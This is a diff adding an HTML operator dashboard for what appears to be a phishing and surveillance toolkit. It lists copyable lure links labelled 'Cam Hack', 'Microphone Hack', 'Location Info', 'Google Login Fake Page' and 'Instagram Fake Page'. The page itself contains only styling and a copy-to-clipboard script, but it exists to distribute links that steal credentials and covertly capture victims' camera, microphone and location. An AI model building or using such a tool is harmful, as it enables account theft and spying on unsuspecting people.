@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard Links</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #121212;
+      color: #ffffff;
+    }
+    header {
+      background-color: #1f1f1f;
+      color: #ffffff;
+      text-align: center;
+      padding: 1rem 0;
+      border-bottom: 1px solid #333;
+    }
+    .container {
+      max-width: 700px;
+      margin: 0 auto;
+      padding: 1rem;
+    }
+    .link-list {
+      list-style-type: none;
+      padding: 0;
+      margin: 0;
+    }
+    .link-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background-color: #1e1e1e;
+      padding: 0.75rem 1rem;
+      margin: 0.5rem 0;
+      border-radius: 5px;
+      border: 1px solid #333;
+    }
+    .link-item a {
+      text-decoration: none;
+      color: #4CAF50;
+      font-weight: bold;
+      flex: 1;
+    }
+    .link-item a:hover {
+      text-decoration: underline;
+    }
+    .copy-btn {
+      background-color: #333;
+      color: #ffffff;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 5px;
+      margin-left: 1rem;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    .copy-btn:hover {
+      background-color: #4CAF50;
+    }
+    footer {
+      text-align: center;
+      margin-top: 2rem;
+      color: #999;
+      font-size: 0.875rem;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Dashboard Links</h1>
+  </header>
+  <div class="container">
+    <ul class="link-list">
+      <li class="link-item">
+        <a href="{GET_HOST}" target="_blank">Your Links</a>
+        <button class="copy-btn" onclick="copyToClipboard('{GET_HOST}')">Copy</button>
+      </li>
+      <li class="link-item">
+        <a href="{host}/" target="_blank">Basic for Device Info</a>
+        <button class="copy-btn" onclick="copyToClipboard('{host}/')">Copy</button>
+      </li>
+      <li class="link-item">
+        <a href="{host}/cam" target="_blank">Cam Hack</a>
+        <button class="copy-btn" onclick="copyToClipboard('{host}/cam')">Copy</button>
+      </li>
+      <li class="link-item">
+        <a href="{host}/loc" target="_blank">Location Info</a>
+        <button class="copy-btn" onclick="copyToClipboard('{host}/loc')">Copy</button>
+      </li>
+      <li class="link-item">
+        <a href="{host}/video" target="_blank">Cam Hack with Videos</a>
+        <button class="copy-btn" onclick="copyToClipboard('{host}/video')">Copy</button>
+      </li>
+      <li class="link-item">
+        <a href="{host}/mic" target="_blank">Microphone Hack</a>
+        <button class="copy-btn" onclick="copyToClipboard('{host}/mic')">Copy</button>
+      </li>
+      <li class="link-item">
+        <a href="{host}/google-login" target="_blank">Google Login Fake Page</a>
+        <button class="copy-btn" onclick="copyToClipboard('{host}/google-login')">Copy</button>
+      </li>
+      <li class="link-item">
+        <a href="{host}/instagram-login-page" target="_blank">Instagram Fake Page</a>
+        <button class="copy-btn" onclick="copyToClipboard('{host}/instagram-login-page')">Copy</button>
+      </li>
+    </ul>
+  </div>
+  <footer>
+    <p>&copy; 2025 Your Project Name</p>
+  </footer>
+
+  <script>
+    function copyToClipboard(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert('Copied to clipboard: ' + text);
+      }).catch(err => {
+        alert('Failed to copy: ' + err);
+      });
+    }
+  </script>
+</body>
+</html>
